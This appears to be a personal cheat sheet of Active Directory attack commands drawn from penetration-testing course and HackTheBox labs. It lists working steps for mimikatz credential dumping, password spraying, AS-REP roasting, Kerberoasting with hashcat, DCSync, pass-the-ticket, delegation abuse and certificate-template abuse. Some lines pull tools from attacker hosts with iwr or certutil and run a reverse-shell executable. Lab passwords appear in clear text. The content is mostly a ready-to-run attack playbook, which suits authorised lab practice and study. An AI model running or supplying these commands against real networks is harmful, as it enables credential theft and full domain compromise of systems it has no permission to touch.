`ldapdomaindump -d 'resourced.local' ldap://192.168.211.175`

`ldapdomaindump -u 'authority.htb\svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' ldaps://10.129.144.243`

`iwr -UseBasicParsing http://192.168.45.154:5050/SharpHound.ps1 -OutFile .\SharpHound.ps1`

SharpHound

`iwr -UseBasicParsing http://192.168.45.154:5050/SharpHound.ps1 -OutFile .\SharpHound.ps1`

`Import-Module .\SharpHound.ps1`

`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corpaudit"`

SMB - IPC$ Read (userenum)

`impacket-lookupsid anonymous@192.168.225.30`

Dump hashes (require local admin)

`.\mimikatz.exe`

`privilege::debug`

`sekurlsa::logonpasswords`

`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"`

Password Policy

`net accounts`


Password Spraying

`crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`

`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`

*If you receive a network error, make sure that the encoding of **usernames.txt** is ANSI. You can use Notepad's Save As functionality to change the encoding.*

## **AS-REP Roasting**

Get hashes (hashcat -a 0 -m 18200 )

From Linux (pete is our compromised user whose password we will need)

`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`

From Victim (Connected to AD)

`.\Rubeus.exe asreproast /nowrap`

```jsx
check for kerboras without having users
  impacket-GetNPUsers HTB.LOCAL/ -dc-ip 10.10.10.161 -request
If we have a vaild users list from ldap or enum4linux
  impacket-GetNPUsers HTB.LOCAL/ -dc-ip 10.10.10.161 -no-pass -usersfile users.txt
```

Crack AS-REP Roasting

`sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

## Kerbroasting

`sudo *ntpdate DCIP*`

hashcat 13100

From Linux (pete is our compromised account)

`sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`

From victim 

`.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`

`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`



*If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate[3](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_442-3) or rdate[4](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_442-4) to do so.*

`impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`

To get our user SID

`whoami /user`

DSSync 

`.\mimikatz.exe`

`lsadump::dcsync /user:corp\dave`

`lsadump::dcsync /user:corp\Administrator`

`impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`

Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 'C:\xampp\htdocs\uploads\rev2.exe'


Pass The Ticket

mimikatz

`privilege::debug`

`sekurlsa::tickets /export`

then exit and run on powershell

`dir *.kirbi`

we want a user with access to web04 for example

(back to mimikatz)

`kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`

now exit and check with klist just to ensure it worked

NOW

`ls \\web04\backup`

ticket 

└─$ KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass


GENERIC ALL

```jsx
net rpc password "CHRISTOPHER.LEWIS" "newP@ssword2022" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.211.21
OR
bloodyAD  -u rsmith -p IHateEric2 -d lab.trusted.vl --host 10.10.194.134 set password ewalters zoz.1234
```

GENERIC ALL

`net user username Password1`

FORCE CHANGE PASSWORD

```jsx
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
[2:25 AM]
Set-DomainUserPassword -Identity 'benjamin' -AccountPassword $NewPassword
```

GENERIC WRITE

`python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`
then crack the hash


If we have generic all (Resource-Based Constrained Delegation)

ON UR MACHINE :

```jsx
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/Kevin-Robertson/Powermad.git
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries (this for rubeus binary)
(cp Powermad/Powermad.ps1 & Rubeus.exe to the same dir)
python -m http.server 9999
```

ON TARGET MACHINE :

```jsx
certutil -urlcache -split -f http://10.10.14.29:9999/Powermad.ps1 pm.ps1
certutil -urlcache -split -f http://10.10.14.29:9999/Rubeus.exe rb.exe
Import-Module ./pm.ps1
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
./rb.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
(save all the result into a file (needed later))
```

ON UR MACHINE :

```jsx
cd ~/htb/Support/impacket/examples
python getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
export KRB5CCNAME=administrator.ccache
(if getting error with administrator.ccache not found, rename : mv administratorblablablabla.ccache administrator.ccache)
python smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```

ADCS

`certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable`

ESC1:

`impacket-addcomputer AUTHORITY.HTB/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name computer_name -computer-pass computer_password`

`certipy req -u 'computer_name$' -p computer_password -ca AUTHORITY-CA -template CorpVPN -upn administrator@AUTHORITY.HTB -dns AUTHORITY.HTB -dc-ip 10.10.11.222`

Now get the hash of admin OR grant your user DCSync priv

`certipy auth -pfx administrator_authority.pfx -domain AUTHORITY.HTB -username administrator -dc-ip 10.10.11.222`

OR when you get (KDC_ERR_PADATA_TYPE_NOSUPP)

`python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain AUTHORITY.HTB -dc-ip "10.10.11.222" -target svc_ldap -elevate
impacket-secretsdump svc_ldap@AUTHORITY.HTB`

`/home/kali/go/bin/ldapnomnom --input /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --output multiservers.txt --dnsdomain ge.local --maxservers 128 --parallel 128 --server 192.168.5.252`

`bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u fsmith -p Thestrokes23 -ns 10.10.10.175 -c all`

find usernames using ldap

  `ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep userPrincipalName:`
  
also grep for svc accounts

  `ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep svc `
  
check for password in description

  `ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" | grep -i description:`

try the password for all users

  `kerbrute passwordspray users.txt 'Welcome123!' -d megabank.local --dc 10.10.10.169`
